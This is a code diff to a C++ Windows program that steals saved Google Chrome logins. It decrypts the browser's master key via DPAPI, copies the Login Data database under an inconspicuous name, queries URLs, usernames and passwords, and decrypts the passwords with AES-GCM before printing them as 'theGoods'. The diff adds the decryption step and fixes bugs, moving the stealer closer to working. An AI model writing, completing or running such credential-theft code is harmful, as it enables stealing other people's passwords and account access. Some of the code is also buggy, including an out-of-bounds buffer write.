@@ -7,13 +7,16 @@
 #include <tuple>
 #include <vector>
 #include "json.hpp" //Source: https://github.com/nlohmann/json
+#include "aes_gcm.h"
+
+#define SQLITE_DONE        101
 
 struct ChromeData {
 	std::string originURL;
 	std::string actionURL;
 	std::string username;
 	std::string password;
-}
+};
 
 std::tuple<std::string, std::string> getChromePaths() {
 	// Get current user (for the filepath)
@@ -23,6 +26,8 @@ std::tuple<std::string, std::string> getChromePaths() {
 
 	if (GetUserNameA(userBuf, &bufSize) == 0) {
 		printf("[ERROR] Could not retrieve username.");
+		free(userBuf);
+		return {"", ""};
 	}
 
 	userBuf[bufSize] = '\0';
@@ -44,6 +49,8 @@ std::tuple<std::string, std::string> getChromePaths() {
 
 	dataFilePath.append(userName);
 	dataFilePath.append(endPath2);
+
+	free(userBuf);
 
 	return {lsFilePath, dataFilePath};
 }
@@ -119,6 +126,7 @@ std::vector<BYTE> b64Decode(std::string strInput){
 
     if (bufCheck == 0) {
     	std::cout << "[ERROR] Decrypt: Could not copy data." << std::endl;
+    	free(buf);
     	return output; //Return empty output
     }
 
@@ -128,6 +136,8 @@ std::vector<BYTE> b64Decode(std::string strInput){
     //Fill output using buf
     std::vector<BYTE> out(buf, buf + confirmSize);
     output = out;
+
+    free(buf);
 
     return output;
 }
@@ -163,18 +173,22 @@ BYTE* decryptDPAPI(std::string decodedKey) {
 			&resultBlob
 		)) {
 		printf("[ERROR] DPAPI decryption failed.\n");
+		LocalFree(resultBlob.pbData);
+		LocalFree(entropyBlob.pbData);
 		return NULL;
 	}
 
 	// Obtain data, free BLOB data
 	BYTE* resultBuf = (BYTE*) malloc(resultBlob.cbData); // +1?
 	std::memcpy(resultBuf, resultBlob.pbData, resultBlob.cbData);
+
 	LocalFree(resultBlob.pbData);
+	LocalFree(entropyBlob.pbData);
 
 	return resultBuf;
 }
 
-BYTE* getAESKEy(std::string chromePath) {
+BYTE* getAESKey(std::string chromePath) {
 
 	// Get file "Local State" contents
 	std::string localStateContents = loadLocalState(chromePath);
@@ -202,6 +216,8 @@ std::string copyChromeData(std::string databasePath) {
 
 	if (GetUserNameA(userBuf, &bufSize) == 0) {
 		printf("[ERROR] Could not retrieve username.");
+		free(userBuf);
+		return 0;
 	}
 
 	//Make copy, use inconspicous name
@@ -217,8 +233,18 @@ std::string copyChromeData(std::string databasePath) {
 			(LPCSTR) databasePath.c_str(),
 			(LPCSTR) copiedPath.c_str(),
 			FALSE) == 0) {
+		free(userBuf);
 		return "\0";
 	}
+
+	free(userBuf);
+
+	// Used for debugging
+	// std::string testPath = "C:\\Users\\";
+	// testPath.append(userName);
+	// std::string endTestPath = "\\AppData\\Local\\Google\\Chrome\\User Data\\default\\LoginDataTEST.db";
+	// testPath.append(endTestPath);
+	// return testPath;
 
 	return copiedPath;
 }
@@ -237,34 +263,51 @@ std::vector<ChromeData> stealData(BYTE* key, std::string databaseFilePath) {
 
 	// Execute SQLite
 	std::string cmd = "select origin_url, action_url, username_value, password_value, date_created, date_last_used from logins order by date_created";
-	int execCheck = sqlite3_exec(db, cmd.c_str(), sqliteCallback, &out, 0);
-
 	sqlite3_stmt* statement; 
+
 	int execCheck = sqlite3_prepare_v2(db, cmd.c_str(), -1, &statement, NULL);
 	if (execCheck) {
 		printf("[ERROR] Could not execute SQLite command\n");
 		sqlite3_close(db);
 		return out;
 	}
-	while ((execCheck = sqlite3_step(statement)) == SQLITE_ROW) {
-        int id = sqlite3_column_int(statement, 0);
-        const char* origin_url = reinterpret_cast<const char*>(sqlite3_column_text(statement, 1));
-        const char* action_url = reinterpret_cast<const char*>(sqlite3_column_text(statement, 2));
-        const char* username = reinterpret_cast<const char*>(sqlite3_column_text(statement, 2));
-        // Just need AES on this password
-        const char* password = reinterpret_cast<const char*>(sqlite3_column_text(statement, 2));
 
-        ChromeData dataOut;
-        dataOut.originURL = std::string(origin_url);
-        dataOut.actionURL = std::string(action_url);
-        dataOut.username = std::string(username);
-        dataOut.password = std::string(password);
+	ChromeData dataOut; //Custom struct at top of file
+
+	// Create AES object, used to decrypt passwords
+	auto aes_obj = new AESGCM(key);
+
+	while ((execCheck = sqlite3_step(statement)) != SQLITE_DONE) {
+        std::string origin_url = std::string(reinterpret_cast<const char*>(sqlite3_column_text(statement, 0)));
+        std::string action_url = std::string(reinterpret_cast<const char*>(sqlite3_column_text(statement, 1)));
+        std::string username = std::string(reinterpret_cast<const char*>(sqlite3_column_text(statement, 2)));
+        // TODO: Just need AES on this password
+        std::string password = std::string(reinterpret_cast<const char*>(sqlite3_column_text(statement, 3)));
+
+        BYTE passwordBytes[password.length()];
+    	std::memcpy(passwordBytes, password.data(), password.length());
+
+    	// Decrypt with AES-GCM
+    	// TODO: Might need debugging
+        aes_obj->Decrypt(NULL, 0, passwordBytes, sizeof(passwordBytes), NULL, 0);
+
+        int bufSize = 256; //Arbitrary size for password, can be modified
+        char* passBuf = (char*) malloc(bufSize + 1);
+        std::memcpy(passBuf, &aes_obj->plaintext, bufSize + 1);
+        passBuf[bufSize + 1] = '\0';
+
+        dataOut.originURL = origin_url;
+        dataOut.actionURL = action_url;
+        dataOut.username = username;
+        dataOut.password = std::string(passBuf);
 
         out.push_back(dataOut);
     }
-    sqlite3_finalize(statement);
 
+    sqlite3_finalize(statement);
 	sqlite3_close(db);
+
+	aes_obj->Cleanup();
 
 	return out;
 }
@@ -277,8 +320,13 @@ int main(int argc, char* argv[]) {
 	auto [chromePath, databasePath] = getChromePaths();
 	//printf("chromePath: %s\n", chromePath.c_str());
 
+	if (chromePath == "" || databasePath == "") {
+		printf("[ERROR] Could not obtain filepaths\n");
+		return 0;
+	}
+
 	// Get AES key
-	BYTE* key = getAESKEy(chromePath);
+	BYTE* key = getAESKey(chromePath);
 	//printf("Key: %s\n", key);
 
 	// SQLite Chrome database path
@@ -294,18 +342,25 @@ int main(int argc, char* argv[]) {
 	// Connect to the databse and steal data
 	std::vector<ChromeData> theGoods = stealData(key, databaseFilePath);
 	if (theGoods.empty()) {
+		printf("[INFO] No data to steal\n");
 		return 0;
 	}
 
 	// Display results
+	// TODO: Fix
+	printf("[INFO] Google Chrome data loaded!:\n");
 	printf("============\n");
 	for (int i = 0; i < theGoods.size(); i++) {
-		printf("originURL: %s\n", theGoods.at(i).originURL);
-		printf("actionURL: %s\n", theGoods.at(i).actionURL);
-		printf("username: %s\n", theGoods.at(i).username);
-		printf("password: %s\n", theGoods.at(i).password);
+		printf("originURL: %s\n", theGoods.at(i).originURL.c_str());
+		printf("actionURL: %s\n", theGoods.at(i).actionURL.c_str());
+		printf("username: %s\n", theGoods.at(i).username.c_str());
+		printf("password: %s\n", theGoods.at(i).password.c_str());
 		printf("============\n");
 	}
+
+	free(key);
+
+	return 0;
 
 	//Notes:
 
